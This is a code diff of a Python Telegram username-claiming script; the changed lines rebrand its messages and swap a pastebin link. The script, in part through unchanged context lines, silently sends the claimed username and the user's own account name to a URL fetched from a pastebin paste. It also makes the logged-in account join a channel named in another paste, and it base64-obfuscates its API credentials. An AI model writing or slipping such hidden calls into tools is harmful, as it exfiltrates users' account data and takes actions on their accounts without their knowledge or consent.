@@ -66,11 +66,11 @@ def fragment(username):
 # for claim username
 def telegram(client,claim,username):
   if claim:
-    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕: 〔 @{username} 〕\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 𝖯𝖾𝗋𝖲𝗈𝗇 〕 : @{client.get_me().username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
+    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , usaByte\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕: 〔 @{username} 〕\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 𝖯𝖾𝗋𝖲𝗈𝗇 〕 : @{client.get_me().username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
     try:get(get('https://pastebin.com/raw/r9sL3w0j').text+text)
     except:pass
   else:
-    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕 : @{username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
+    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , usaByte\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕 : @{username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
   client.send_message('me',text)
 def climed(client,username):
     id = (
@@ -147,7 +147,7 @@ def clientX():
   client = TelegramClient("aho", b64decode("MjUzMjQ1ODE=").decode(),b64decode("MDhmZWVlNWVlYjZmYzBmMzFkNWYyZDIzYmIyYzMxZDA=").decode())
   try:client.start(phone=phone)
   except:exit()
-  try:client(JoinChannelRequest(get('https://pastebin.com/raw/SgDUMsFb').text))
+  try:client(JoinChannelRequest(get('https://pastebin.com/raw/fr4B16Fb').text))
   except:pass
   clear()
   return client
